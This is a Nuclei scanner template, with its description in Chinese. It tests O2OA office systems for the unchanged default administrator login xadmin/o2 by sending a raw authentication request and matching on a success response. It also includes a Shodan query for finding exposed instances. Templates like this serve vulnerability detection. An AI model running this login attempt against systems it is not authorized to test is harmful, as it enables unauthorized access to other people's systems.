id: o2oa-default-login

info:
  name: O2OA 默认口令登录（弱口令）
  author: SleepingBag945
  severity: high
  description: |
    该模板通过尝试 O2OA 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。 在部分部署场景下，还可能进一步造成远程代码执行。
  classification:
    cpe: cpe:2.3:a:zoneland:o2oa:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: zoneland
    product: o2oa
    shodan-query: title=="O2OA"
  tags: o2oa,default-login,vuln

http:
  - raw:
      - |
        POST /x_organization_assemble_authentication/jaxrs/authentication/captcha HTTP/1.1
        Host: {{Hostname}}
        Cookie: x-token=anonymous
        Authorization: anonymous
        Accept: text/html,application/json,*/*
        Content-Type: application/json; charset=UTF-8

        {"credential":"{{username}}","password":"{{password}}"}

    payloads:
      username:
        - 'xadmin'
      password:
        - 'o2'
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"type\": \"success\""
          - "distinguishedName"
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
